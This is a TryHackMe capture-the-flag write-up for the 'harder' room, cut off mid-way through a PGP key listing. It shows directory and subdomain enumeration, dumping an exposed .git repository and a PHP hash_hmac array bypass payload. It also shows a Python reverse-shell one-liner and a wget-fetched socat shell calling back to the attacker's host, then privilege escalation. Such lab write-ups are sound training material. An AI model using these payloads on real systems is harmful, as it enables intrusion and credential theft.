# harder

## Introduction

Welcome to my another writeup! In this TryHackMe [harder](https://tryhackme.com/room/harder) room, you'll learn: Directory enumeration, dumping publicly exposed `.git` repository, HTTP header `X-Forwarded-For` bypass, PHP `hash_hmac()` bypass, and more! Without further ado, let's dive in.

- Overall difficulty for me (From 1-10 stars): ★★★★★☆☆☆☆☆

## Background

The machine is completely inspired by real world pentest findings. Perhaps you will consider them very challenging but without any rabbit holes. Once you have a shell it is very important to know which underlying linux distribution is used and where certain configurations are located.

Hints to the initial foodhold: Look closely at every request. Re-scan all newly found web services/folders and may use some wordlists from seclists ([https://tools.kali.org/password-attacks/seclists](https://tools.kali.org/password-attacks/seclists)). Read the source with care.

Edit: There is a second way to get root access without using any key...are you able to spot the bug?

---

> Real pentest findings combined

> Difficulty: Medium

## Service Enumeration

As usual, scan the machine for open ports via `rustscan`!

**Rustscan:**
```
┌──(root🌸siunam)-[~/ctf/thm/ctf/harder]
└─# export RHOSTS=10.10.233.137
                                                                                                           
┌──(root🌸siunam)-[~/ctf/thm/ctf/harder]
└─# rustscan --ulimit 5000 -b 4500 -t 2000 --range 1-65535 $RHOSTS -- -sC -sV -oN rustscan/rustscan.txt
[...]
PORT   STATE SERVICE REASON         VERSION
22/tcp open  ssh     syn-ack ttl 62 OpenSSH 8.3 (protocol 2.0)
| ssh-hostkey:
|   4096 cfe2d927d2d9f3f78e5dd2f99da4fb66 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAACAQCns4FcsZGpefUl1pFm7KRPBXz7nIQ590yiEd6aNm6DEKKVQOUUT4TtSEpCaUhnDU/+XHFBJfXdm73tzEwCgN7fyxmXSCWDWu1tC1zui3CA/sr/g5k+Az0u1yTvoc3eUSByeGvVyShubpuCB5Mwa2YZJxiHu/WzFrtDbGIGiVcQgLJTXdXE+aK7hbsx6T9HMJpKEnneRvLY4WT6ZNjw8kfp6oHMFvz/lnDffyWMNxn9biQ/pSkZHOsBzLcAfAYXIp6710byAWGwuZL2/d6Yq1jyLY3bic6R7HGVWEX6VDcrxAeED8uNHF8kPqh46dFkyHekOOye6TnALXMZ/uo3GSvrJd1OWx2kZ1uPJWOl2bKj1aVKKsLgAsmrrRtG1KWrZZDqpxm/iUerlJzAl3YdLxyqXnQXvcBNHR6nc4js+bJwTPleuCOUVvkS1QWkljSDzJ878AKBDBxVLcFI0vCiIyUm065lhgTiPf0+v4Et4IQ7PlAZLjQGlttKeaI54MZQPM53JPdVqASlVTChX7689Wm94//boX4/YlyWJ0EWz/a0yrwifFK/fHJWXYtQiQQI02gPzafIy7zI6bO3N7CCkWdTbBPmX+zvw9QcjCxaq1T+L/v04oi0K1StQlCUTE12M4fMeO/HfAQYCRm6tfue2BlAriIomF++Bh4yO73z3YeNuQ==
|   256 1e457b0ab5aa87e61bb1b79f5d8f8570 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIB+INGLWU0nf9OkPJkFoW9Gx2tdNEjLVXHrtZg17ALjH
80/tcp open  http    syn-ack ttl 62 nginx 1.18.0
|_http-title: Error
| http-methods:
|_  Supported Methods: GET HEAD POST
|_http-server-header: nginx/1.18.0
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

According to `rustscan` result, we have 2 ports are opened:

Open Ports        | Service
------------------|------------------------
22                | OpenSSH 8.3
80                | nginx 1.18.0

### HTTP on Port 80

**Adding a new domain to `/etc/hosts`:** (Optional, but it's a good practice to do so)
```
┌──(root🌸siunam)-[~/ctf/thm/ctf/harder]
└─# echo "$RHOSTS harder.thm" >> /etc/hosts
```

**Home page:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/harder/images/Pasted%20image%2020221120042436.png)

We can see **this page is powered by `php-fpm`.**

**Next, let's enumerate hidden directory and file via `gobuster`!**
```
┌──(root🌸siunam)-[~/ctf/thm/ctf/harder]
└─# gobuster dir -u http://harder.thm/ -w /usr/share/seclists/Discovery/Web-Content/raft-medium-files.txt -t 100 --exclude-length 1985
[...]
/phpinfo.php          (Status: 200) [Size: 86505]
```

Found `phpinfo.php`!

![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/harder/images/Pasted%20image%2020221120044102.png)

**In here, I saw `/wronglocation` directory, but when I go to there, nothing happend.**

![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/harder/images/Pasted%20image%2020221120044153.png)

**Also, I ran `nikto` to see any vulnerabilities in this website:**
```
┌──(root🌸siunam)-[~/ctf/thm/ctf/harder]
└─# nikto -h harder.thm    
[...]
+ Server: nginx/1.18.0
+ Retrieved x-powered-by header: PHP/7.3.19
[...]
+ Cookie TestCookie created without the httponly flag
[...]
```

The PHP version is `7.3.19`, and **it sets a cookie called `TestCookie`??**

**Let's find that cookie!**
```
┌──(root🌸siunam)-[~/ctf/thm/ctf/harder]
└─# curl -vv http://harder.thm/        
[...]
< Set-Cookie: TestCookie=just+a+test+cookie; expires=Sun, 20-Nov-2022 10:43:47 GMT; Max-Age=3600; path=/; domain=pwd.harder.local; secure
[...]
```

**As you can see, it has a `domain` value! `pwd.harder.local`**

**Let's add that domain to `/etc/hosts`!**
```
10.10.233.137 harder.thm pwd.harder.local
```

**pwd.harder.local:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/harder/images/Pasted%20image%2020221120044610.png)

In here, we can see there is a login page.

**We can try to guess the password, like `admin:admin`:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/harder/images/Pasted%20image%2020221120044701.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/harder/images/Pasted%20image%2020221120044709.png)

`extra security in place. our source code will be reviewed soon ...`??

**Seems deadend here, let's enumerate hidden directory and file again via `gobuster`:**
```
┌──(root🌸siunam)-[~/ctf/thm/ctf/harder]
└─# gobuster dir -u http://pwd.harder.local/ -w /usr/share/seclists/Discovery/Web-Content/raft-medium-files.txt -t 100             
[...]
/index.php            (Status: 200) [Size: 19926]
/auth.php             (Status: 200) [Size: 0]
/.                    (Status: 200) [Size: 19926]
/.git                 (Status: 301) [Size: 169] [--> http://pwd.harder.local:8080/.git/]
/.gitignore           (Status: 200) [Size: 27]
```

**Hmm... This time we saw some interesting files and a directory: `/.git`, `/.gitignore`**

**`/.gitignore`**
```
┌──(root🌸siunam)-[~/ctf/thm/ctf/harder]
└─# curl http://pwd.harder.local/.gitignore
credentials.php
secret.php
```

**Those looks like a hidden file! Let's try to view them:**
```
┌──(root🌸siunam)-[~/ctf/thm/ctf/harder]
└─# curl http://pwd.harder.local/credentials.php    
                                                                                                           
┌──(root🌸siunam)-[~/ctf/thm/ctf/harder]
└─# curl http://pwd.harder.local/secret.php     
                                                                                                           
```

Empty??

**How about the `/.git` directory?**
```
┌──(root🌸siunam)-[~/ctf/thm/ctf/harder]
└─# curl -vv http://pwd.harder.local/.git           
*   Trying 10.10.233.137:80...
* Connected to pwd.harder.local (10.10.233.137) port 80 (#0)
> GET /.git HTTP/1.1
> Host: pwd.harder.local
> User-Agent: curl/7.85.0
> Accept: */*
> 
* Mark bundle as not supporting multiuse
< HTTP/1.1 301 Moved Permanently
< Server: nginx/1.18.0
< Date: Sun, 20 Nov 2022 09:57:31 GMT
< Content-Type: text/html
< Content-Length: 169
< Location: http://pwd.harder.local:8080/.git/
< Connection: keep-alive
< 
<html>
<head><title>301 Moved Permanently</title></head>
<body>
<center><h1>301 Moved Permanently</h1></center>
<hr><center>nginx/1.18.0</center>
</body>
</html>
* Connection #0 to host pwd.harder.local left intact
```

Hmm... It redirects me to `http://pwd.harder.local:8080/.git/`

Let's take a step back.

**Now we found `pwd.harder.local` subdomain, maybe it has more subdomain in `*.harder.local`?**

**Let's fuzzing subdomain via `ffuf`!**
```
┌──(root🌸siunam)-[~/ctf/thm/ctf/harder]
└─# ffuf -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt -u http://pwd.harder.local/ -H "Host: FUZZ.harder.local" -fs 1985
[...]
shell                   [Status: 200, Size: 19912, Words: 526, Lines: 24, Duration: 212ms]
```

**Found new subdomain: `shell.harder.local`!**

**Again, add that subdomain to `/etc/hosts`:**
```
10.10.233.137 harder.thm pwd.harder.local shell.harder.local
```

**shell.harder.local:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/harder/images/Pasted%20image%2020221120051812.png)

**Again, let's try to guess the credentials:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/harder/images/Pasted%20image%2020221120051846.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/harder/images/Pasted%20image%2020221120051851.png)

This time we got `Invalid login credentials!`.

**Hmm... Let's enumerate hidden directory and file again:**
```
┌──(root🌸siunam)-[~/ctf/thm/ctf/harder]
└─# gobuster dir -u http://shell.harder.local/ -w /usr/share/seclists/Discovery/Web-Content/raft-large-files.txt -t 100
[...]
/index.php            (Status: 200) [Size: 19912]
/auth.php             (Status: 200) [Size: 0]
/.                    (Status: 200) [Size: 19912]
/ip.php               (Status: 200) [Size: 73]
/50x.html             (Status: 200) [Size: 494]
```

**The `/ip.php` looks sussy!**

![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/harder/images/Pasted%20image%2020221120052133.png)

**Only `10.10.10.x` is allowed??**

**Hmm... Maybe HTTP header `X-Forwarded-For` might bypass this??**
```
┌──(root🌸siunam)-[~/ctf/thm/ctf/harder]
└─# curl -vv http://shell.harder.local/ip.php -H "X-Forwarded-For: 10.10.10.1"  
*   Trying 10.10.233.137:80...
* Connected to shell.harder.local (10.10.233.137) port 80 (#0)
> GET /ip.php HTTP/1.1
> Host: shell.harder.local
> User-Agent: curl/7.85.0
> Accept: */*
> X-Forwarded-For: 10.10.10.1
> 
* Mark bundle as not supporting multiuse
< HTTP/1.1 200 OK
< Server: nginx/1.18.0
< Date: Sun, 20 Nov 2022 10:23:13 GMT
< Content-Type: text/html; charset=UTF-8
< Transfer-Encoding: chunked
< Connection: keep-alive
< Vary: Accept-Encoding
< X-Powered-By: PHP/7.3.19
< 
* Connection #0 to host shell.harder.local left intact
```

Hmm... Nothing.

## Initial Foothold

After banging my head against the wall, I found that we can use **[GitTools](https://github.com/internetwache/GitTools)** to dump `.git` repository from the web server!

**Let's dump the `/.git` directory in `pwd.harder.local`!**
```
┌──(root🌸siunam)-[~/ctf/thm/ctf/harder]
└─# /opt/GitTools/Dumper/gitdumper.sh http://pwd.harder.local/.git/ git
[...]
[*] Destination folder does not exist
[+] Creating git/.git/
[+] Downloaded: HEAD
[-] Downloaded: objects/info/packs
[+] Downloaded: description
[+] Downloaded: config
[+] Downloaded: COMMIT_EDITMSG
[+] Downloaded: index
[-] Downloaded: packed-refs
[+] Downloaded: refs/heads/master
[-] Downloaded: refs/remotes/origin/HEAD
[-] Downloaded: refs/stash
[+] Downloaded: logs/HEAD
[+] Downloaded: logs/refs/heads/master
[-] Downloaded: logs/refs/remotes/origin/HEAD
[-] Downloaded: info/refs
[+] Downloaded: info/exclude
[-] Downloaded: /refs/wip/index/refs/heads/master
[-] Downloaded: /refs/wip/wtree/refs/heads/master
[+] Downloaded: objects/93/99abe877c92db19e7fc122d2879b470d7d6a58
[-] Downloaded: objects/00/00000000000000000000000000000000000000
[+] Downloaded: objects/ad/68cc6e2a786c4e671a6a00d6f7066dc1a49fc3
[+] Downloaded: objects/04/7afea4868d8b4ce8e7d6ca9eec9c82e3fe2161
[+] Downloaded: objects/e3/361e96c0a9db20541033f254df272deeb9dba7
[+] Downloaded: objects/c6/66164d58b28325393533478750410d6bbdff53
[+] Downloaded: objects/aa/938abf60c64cdb2d37d699409f77427c1b3826
[+] Downloaded: objects/cd/a7930579f48816fac740e2404903995e0ff614
[+] Downloaded: objects/22/8694f875f20080e29788d7cc3b626272107462
[+] Downloaded: objects/66/428e37f6bfaac0b42ce66106bee0a5bdf94d4e
[+] Downloaded: objects/6e/1096eae64fede71a78e54999236553b75b3b65
[+] Downloaded: objects/be/c719ffb34ca3d424bd170df5f6f37050d8a91c
```

**Now we have a copy of that `.git` repository!**
```
┌──(root🌸siunam)-[~/ctf/thm/ctf/harder]
└─# ls -lah
total 24K
drwxr-xr-x  4 root root 4.0K Nov 20 06:08 .
drwxr-xr-x 63 root root 4.0K Nov 20 04:16 ..
drwxr-xr-x  3 root root 4.0K Nov 20 06:08 git
```

**Let's find all the commit logs!**
```
┌──(root🌸siunam)-[~/ctf/thm/ctf/harder]
└─# cd git

┌──(root🌸siunam)-[~/…/thm/ctf/harder/git]
└─# git log   
commit 9399abe877c92db19e7fc122d2879b470d7d6a58 (HEAD -> master)
Author: evs <evs@harder.htb>
Date:   Thu Oct 3 18:12:23 2019 +0300

    add gitignore

commit 047afea4868d8b4ce8e7d6ca9eec9c82e3fe2161
Author: evs <evs@harder.htb>
Date:   Thu Oct 3 18:11:32 2019 +0300

    add extra security

commit ad68cc6e2a786c4e671a6a00d6f7066dc1a49fc3
Author: evs <evs@harder.htb>
Date:   Thu Oct 3 14:00:52 2019 +0300

    added index.php
```

**Then use `checkout` to get all the files in the previous commits:**
```
┌──(root🌸siunam)-[~/…/thm/ctf/harder/git]
└─# git checkout .                                       
Updated 4 paths from the index
                                                                                                           
┌──(root🌸siunam)-[~/…/thm/ctf/harder/git]
└─# ls -lah
total 48K
drwxr-xr-x 3 root root 4.0K Nov 20 06:13 .
drwxr-xr-x 4 root root 4.0K Nov 20 06:08 ..
-rw-r--r-- 1 root root  24K Nov 20 06:13 auth.php
drwxr-xr-x 6 root root 4.0K Nov 20 06:13 .git
-rw-r--r-- 1 root root   27 Nov 20 06:13 .gitignore
-rw-r--r-- 1 root root  431 Nov 20 06:13 hmac.php
-rw-r--r-- 1 root root  608 Nov 20 06:13 index.php
```

**`index.php`:**
```php
<?php
  session_start();
  require("auth.php");
  $login = new Login;
  $login->authorize();
  require("hmac.php");
  require("credentials.php");
?> 
  <table style="border: 1px solid;">
     <tr>
       <td style="border: 1px solid;">url</td>
       <td style="border: 1px solid;">username</td>
       <td style="border: 1px solid;">password (cleartext)</td>
     </tr>
     <tr>
       <td style="border: 1px solid;"><?php echo $creds[0]; ?></td>
       <td style="border: 1px solid;"><?php echo $creds[1]; ?></td>
       <td style="border: 1px solid;"><?php echo $creds[2]; ?></td>
     </tr>
   </table>
```

In here, we can see `index.php` is **including the `auth.php`, `hmac.php`, `credetnials.php` file, and call `authorize()` method via `Login` class.**

**`auth.php`:**
```php
<?php
define('LOGIN_USER', "admin");
define('LOGIN_PASS', "admin");

define('LOGOUT_COMPLETE', "You've been successfully logged out.");
define('INCORRECT_USERNAME_PASSWORD', "Invalid login credentials!");
define('STARTER_GREETING', "Harder Corp. - Password Manager");
define('USERNAME', "Username");
define('PASSWORD', "Password");
define('ENTER_USERNAME', "Enter Username");
define('ENTER_PASSWORD', "Enter Password");
define('REMEMBER_THIS_COMPUTER', "Remember this computer");
define('BUTTON_LOGIN', "Log in &rarr;");

// ================================================================================================
// ### DO NOT TOUCH ANYTHING BELOW THIS LINE ###
// ================================================================================================

class Login {
	// unique prefix that is used with this object (on cookies and password salt)
	var $prefix = "login_";
	// days "remember me" cookies will remain
	var $cookie_duration = 21;
	// temporary values for comparing login are auto set here. do not set your own $user or $pass here
	var $user = "";
	var $pass = "";

  function authorize() {
	//save cookie info to session
	if(isset($_COOKIE[$this->prefix.'user'])){
		$_SESSION[$this->prefix.'user'] = $_COOKIE[$this->prefix.'user'];
		$_SESSION[$this->prefix.'pass'] = $_COOKIE[$this->prefix.'pass'];
	}

	//if setting vars
	if(isset($_POST['action']) && $_POST['action'] == "set_login"){

		$this->user = $_POST['user'];
		$this->pass = md5($this->prefix.$_POST['pass']); //hash password. salt with prefix

		$this->check();//dies if incorrect

		//if "remember me" set cookie
		if(isset($_POST['remember'])){
			setcookie($this->prefix."user", $this->user, time()+($this->cookie_duration*86400));// (d*24h*60m*60s)
			setcookie($this->prefix."pass", $this->pass, time()+($this->cookie_duration*86400));// (d*24h*60m*60s)
		}

		//set session
		$_SESSION[$this->prefix.'user'] = $this->user;
		$_SESSION[$this->prefix.'pass'] = $this->pass;
	}

	//if forced log in
	elseif(isset($_GET['action']) && $_GET['action'] == "prompt"){
		session_unset();
		session_destroy();
		//destroy any existing cookie by setting time in past
		if(!empty($_COOKIE[$this->prefix.'user'])) setcookie($this->prefix."user", "blanked", time()-(3600*25));
		if(!empty($_COOKIE[$this->prefix.'pass'])) setcookie($this->prefix."pass", "blanked", time()-(3600*25));

		$this->prompt();
	}

	//if clearing the login
	elseif(isset($_GET['action']) && $_GET['action'] == "clear_login"){
		session_unset();
		session_destroy();
		//destroy any existing cookie by setting time in past
		if(!empty($_COOKIE[$this->prefix.'user'])) setcookie($this->prefix."user", "blanked", time()-(3600*25));
		if(!empty($_COOKIE[$this->prefix.'pass'])) setcookie($this->prefix."pass", "blanked", time()-(3600*25));

		$msg = '<span class="green">'.LOGOUT_COMPLETE.'</span>';
		$this->prompt($msg);
	}

	//prompt for
	elseif(!isset($_SESSION[$this->prefix.'pass']) || !isset($_SESSION[$this->prefix.'user'])){
		$this->prompt();
	}

	//check the pw
	else{
		$this->user = $_SESSION[$this->prefix.'user'];
		$this->pass = $_SESSION[$this->prefix.'pass'];
		$this->check();//dies if incorrect
	}

}

function check(){

	if(md5($this->prefix . LOGIN_PASS) != $this->pass || LOGIN_USER != $this->user){
		//destroy any existing cookie by setting time in past
		if(!empty($_COOKIE[$this->prefix.'user'])) setcookie($this->prefix."user", "blanked", time()-(3600*25));
		if(!empty($_COOKIE[$this->prefix.'pass'])) setcookie($this->prefix."pass", "blanked", time()-(3600*25));
		session_unset();
		session_destroy();

		$msg='<span class="red">'.INCORRECT_USERNAME_PASSWORD.'</span>';
		$this->prompt($msg);
	}
}

function prompt($msg=''){
?>
<html><head><title><?php echo STARTER_GREETING; ?></title>	<style>
[Bunch of CSS here]
</style></head><body>
<div class="wrapper"><div class="highlight"><div class="center">
<form class="pure-form pure-form-stacked" action="<?php echo $_SERVER['SCRIPT_NAME']; ?>" method="post">
    <fieldset>
        <legend><?php if ($msg !== '') { echo $msg; } else { echo STARTER_GREETING; } ?></legend>
        <input type="hidden" name="action" value="set_login">
        <!-- <label for="username"><strong><?php echo USERNAME; ?>:</strong></label> -->
        <input id="username" type="text" name="user" placeholder="<?php echo ENTER_USERNAME; ?>" class="pure-input-1">
        <!-- <label for="password"><strong><?php echo PASSWORD; ?>:</strong></label> -->
        <input id="password" type="password" name="pass" placeholder="<?php echo ENTER_PASSWORD; ?>" class="pure-input-1">
        <label for="remember" class="pure-checkbox">
            <input id="remember" name="remember" type="checkbox"> <?php echo REMEMBER_THIS_COMPUTER; ?>
        </label>
        <button type="submit" class="pure-button pure-button-primary"><?php echo BUTTON_LOGIN; ?></button>
    </fieldset>
</form>
</div></div></div>
</body></html>

<?php exit;}} ?>
```

**It may seem a little bit scary, let's break it down:**
- `LOGIN_USER` = `admin`
- `LOGIN_PASS` = `admin`

So the login credentials is `admin:admin`.

- If the username and the MD5 hashed password is matched, then we're authorized

**`hmac.php`:**
```php
<?php
if (empty($_GET['h']) || empty($_GET['host'])) {
   header('HTTP/1.0 400 Bad Request');
   print("missing get parameter");
   die();
}
require("secret.php"); //set $secret var
if (isset($_GET['n'])) {
   $secret = hash_hmac('sha256', $_GET['n'], $secret);
}

$hm = hash_hmac('sha256', $_GET['host'], $secret);
if ($hm !== $_GET['h']){
  header('HTTP/1.0 403 Forbidden');
  print("extra security check failed");
  die();
}
?>
```

Hmm... Something interesting here.

- **If the GET parameter `h` AND `host` is not set**, then return `400 Bad Request`
- HMAC implementation in PHP:
	- **If `n` GET parameter is set, `$secret` = SHA256 hash with `n` and `$secret`, which is defined in `secret.php` and we don't have access to it**
- `$hm` = SHA256 hash with GET parameter `host` and `$secret`
- If `$hm` is NOT equal to GET parameter `h`, then return `403 Forbidden`

**Now, since we don't have access to `secret.php`, we have to bypass it!**

**Luckly, by googling `php hmac bypass`, I found this [blog](https://www.securify.nl/blog/spot-the-bug-challenge-2018-warm-up/):**

![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/harder/images/Pasted%20image%2020221120063650.png)

**In our instance, we can see the `hmac.php` is using strict comparsion (`!==`):**
```php
if ($hm !== $_GET['h']){
```

![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/harder/images/Pasted%20image%2020221120063852.png)

**Hmm... We can force the `hash_hmac` function returns `True`!**

**Let's create a PHP file to generate a SHA256 HMAC hash!**
```php
<?php
$hm = hash_hmac('sha256','anything.site',false);
echo($hm);
?>
```

```
┌──(root🌸siunam)-[~/ctf/thm/ctf/harder]
└─# php -f hmac_bypass.php
e72e5e6765b7ef3d70e4aec85612026f092edfa009024efeb1f576f3c9c2f46a
```

**Then, we can craft our final payload:**
```
index.php?n[]=&host=anything.site&h=e72e5e6765b7ef3d70e4aec85612026f092edfa009024efeb1f576f3c9c2f46a
```

- `n[]` = An empty array
- `host` = Hostname, it can be anything
- `h` = Our crafted HMAC SHA256 hash, which is `false`

**To bypass the HMAC check, we'll need to login first, then copy and paste our payload:**

- Login as `admin`:

![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/harder/images/Pasted%20image%2020221120070835.png)

- Copy and paste our payload:

![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/harder/images/Pasted%20image%2020221120070920.png)

Boom! We did it!

**Now, we can see a table:**
- `url`: `http://shell.harder.local`
- `username`: `evs`
- `password (cleartext)`: `{Redacted}`

**Since we already found the `shell` subdomain, we can just login as that `evs` user!**

![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/harder/images/Pasted%20image%2020221120071301.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/harder/images/Pasted%20image%2020221120071310.png)

**Now, try to bypass it via `X-Forwarded-For: 10.10.10.1` via Burp Suite!**

![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/harder/images/Pasted%20image%2020221120071647.png)

Hmm... No response???

Okay, since it said **it's a web shell, it might only accept POST request and a certain POST parameter!**

**In Burp Suite, we can change the request method to POST request:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/harder/images/Pasted%20image%2020221120071853.png)

Then, we can try some POST parameter. **Based on my experience, the most common webshell's POST parameter is `cmd`!**

**Let's send a POST request with `cmd` parameter!**

![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/harder/images/Pasted%20image%2020221120072111.png)

**Yes! The POST parameter is `cmd`!**

However, when I try to execute commands, it has no output.

**After fumbling around, I found that we need to include the login credentials as well!!**

![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/harder/images/Pasted%20image%2020221120072944.png)

**We now have command execution, why not get a shell? :D**

**To do so, I'll:**

- Setup a `nc` listener:

```
┌──(root🌸siunam)-[~/ctf/thm/ctf/harder]
└─# nc -lnvp 443           
listening on [any] 443 ...
```

- Send a Python reverse shell payload: (Generated from [revshells.com](https://www.revshells.com/))

```bash
python3 -c 'import os,pty,socket;s=socket.socket();s.connect(("YOUR_IP",443));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn("/bin/sh")'
```

![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/harder/images/Pasted%20image%2020221120073350.png)

```
┌──(root🌸siunam)-[~/ctf/thm/ctf/harder]
└─# nc -lnvp 443
listening on [any] 443 ...
connect to [10.9.0.253] from (UNKNOWN) [10.10.233.137] 52714
/www/shell $ ^[[23;14Rwhoami;hostname;id;ip a
whoami;hostname;id;ip a
www
harder
uid=1001(www) gid=1001(www) groups=1001(www)
[...]
4: eth0@if5: <BROADCAST,MULTICAST,UP,LOWER_UP,M-DOWN> mtu 1500 qdisc noqueue state UP 
    link/ether 02:42:ac:11:00:02 brd ff:ff:ff:ff:ff:ff
    inet 172.17.0.2/16 brd 172.17.255.255 scope global eth0
       valid_lft forever preferred_lft forever
```

**I'm user `www`!**

**Stable shell via `socat`:**
```
┌──(root🌸siunam)-[/opt/static-binaries/binaries/linux/x86_64]
└─# python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...

/www/shell $ ^[[23;14Rwget http://10.9.0.253/socat -O /tmp/socat;chmod +x /tmp/socat;/tmp/socat TCP:10.9.0.253:4444 EXEC:'/bin/sh',pty,stderr,setsid,sigint,sane

┌──(root🌸siunam)-[~/ctf/thm/ctf/harder]
└─# socat -d -d file:`tty`,raw,echo=0 TCP-LISTEN:4444
2022/11/20 07:43:25 socat[139829] N opening character device "/dev/pts/2" for reading and writing
2022/11/20 07:43:25 socat[139829] N listening on AF=2 0.0.0.0:4444
                                                                  2022/11/20 07:44:32 socat[139829] N accepting connection from AF=2 10.10.233.137:37740 on AF=2 10.9.0.253:4444
                                                                     2022/11/20 07:44:32 socat[139829] N starting data transfer loop with FDs [5,5] and [7,7]
                                                  /bin/sh: can't access tty; job control turned off
/www/shell $ stty rows 23 columns 107
/www/shell $ export TERM=xterm-256color
/www/shell $ ^C
/www/shell $ 
```

**user.txt:**
```
/www/shell $ cat /home/evs/user.txt 
{Redacted}
```

## Privilege Escalation

### www to evs

**In here, we can do some manual enumeration:**

- SUID binary:

```
/www/shell $ find / -perm -4000 2>/dev/null
/usr/local/bin/execute-crypted
```

**That `execute-crypted` binary is weird!**

- Kernel version:

```
/www/shell $ uname -a; cat /etc/issue
Linux harder 4.15.0-112-generic #113-Ubuntu SMP Thu Jul 9 23:41:39 UTC 2020 x86_64 Linux
Welcome to Alpine Linux 3.12
Kernel \r on an \m (\l)
```

It's an Alpine Linux!

**If we check this IP, we'll see:**
```
/www/shell $ ip a
1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN qlen 1000
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
    inet 127.0.0.1/8 scope host lo
       valid_lft forever preferred_lft forever
4: eth0@if5: <BROADCAST,MULTICAST,UP,LOWER_UP,M-DOWN> mtu 1500 qdisc noqueue state UP 
    link/ether 02:42:ac:11:00:02 brd ff:ff:ff:ff:ff:ff
    inet 172.17.0.2/16 brd 172.17.255.255 scope global eth0
       valid_lft forever preferred_lft forever
```

**The `172.17.0.2` address indicates that we're inside a container.**

- Listening ports:

```
/www/shell $ netstat -tunlp
netstat: showing only processes with your user ID
Active Internet connections (only servers)
Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name    
tcp        0      0 127.0.0.1:9000          0.0.0.0:*               LISTEN      63/python3
tcp        0      0 0.0.0.0:8080            0.0.0.0:*               LISTEN      10/nginx: worker pr
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -
tcp        0      0 :::8080                 :::*                    LISTEN      10/nginx: worker pr
tcp        0      0 :::22                   :::*                    LISTEN      -
```

**We can see that port `9000` is listening in localhost, and the process name is `python3`**

Let's go back to the weird SUID binary:

```
/www/shell $ ls -lah /usr/local/bin/execute-crypted
-rwsr-x---    1 root     evs        19.5K Jul  6  2020 /usr/local/bin/execute-crypted
```

**Hmm... It's owned by `root` and `evs` group, and it doesn't have world-readable/writable/executable permission... So we can't run it at the moment, as we're not evs or root:**
```
/www/shell $ /usr/local/bin/execute-crypted
/bin/sh: /usr/local/bin/execute-crypted: Permission denied
```

- Cronjob:

**After some manual enumeration, I found a sussy cronjob:**
```
/www/shell $ ls -lah /etc/periodic/15min/
total 12K    
drwxr-xr-x    1 root     root        4.0K Jul  7  2020 .
drwxr-xr-x    1 root     root        4.0K May 29  2020 ..
-rwxr-xr-x    1 www      www          190 Jul  6  2020 evs-backup.sh
```

```
/www/shell $ cat /etc/periodic/15min/evs-backup.sh 
#!/bin/ash

# ToDo: create a backup script, that saves the /www directory to our internal server
# for authentication use ssh with user "evs" and password "{Redacted}"
```

We found user `evs` password!!

**Let's SSH into `evs`:**
```
┌──(root🌸siunam)-[~/ctf/thm/ctf/harder]
└─# ssh evs@$RHOSTS
[...]
evs@10.10.233.137's password: 
[...]
harder:~$ whoami;hostname;id;ip a
evs
harder
uid=1000(evs) gid=1000(evs) groups=1000(evs)
[...]
4: eth0@if5: <BROADCAST,MULTICAST,UP,LOWER_UP,M-DOWN> mtu 1500 qdisc noqueue state UP 
    link/ether 02:42:ac:11:00:02 brd ff:ff:ff:ff:ff:ff
    inet 172.17.0.2/16 brd 172.17.255.255 scope global eth0
       valid_lft forever preferred_lft forever
harder:~$ 
```

We're user `evs`!

### evs to root

> Note: There are 2 ways to escalate to root!!

#### Abusing GPG decryption

**When I doing enumeration in user `www`, the `/var/backups` is owned by `root` and `evs` group, which is very weird:**
```
harder:~$ ls -alh /var
total 68K    
drwxr-xr-x    1 root     root        4.0K Jul  7  2020 .
drwxr-xr-x    1 root     root        4.0K Jul  7  2020 ..
drwxr-x---    1 root     evs         4.0K Jul  7  2020 backup
[...]
```

**Let's see what's inside!**
```
harder:~$ ls -alh /var/backup/
total 16K    
drwxr-x---    1 root     evs         4.0K Jul  7  2020 .
drwxr-xr-x    1 root     root        4.0K Jul  7  2020 ..
-rwxr-x---    1 root     evs          641 Jul  7  2020 root@harder.local.pub

harder:~$ cat /var/backup/root@harder.local.pub
-----BEGIN PGP PUBLIC KEY BLOCK-----

mDMEXwTf8RYJKwYBBAHaRw8BAQdAkJtb3UCYvPmb1/JyRPADF0uYjU42h7REPlOK
AbiN88i0IUFkbWluaXN0cmF0b3IgPHJvb3RAaGFyZGVyLmxvY2FsPoiQBBMWCAA4
FiEEb5liHk1ktq/OVuhkyR1mFZRPaHQFAl8E3/ECGwMFCwkIBwIGFQoJCAsCBBYC
AwECHgECF4AACgkQyR1mFZRPaHSt8wD8CvJLt7qyCXuJZdOBPR+X7GI2dUg0DRRu
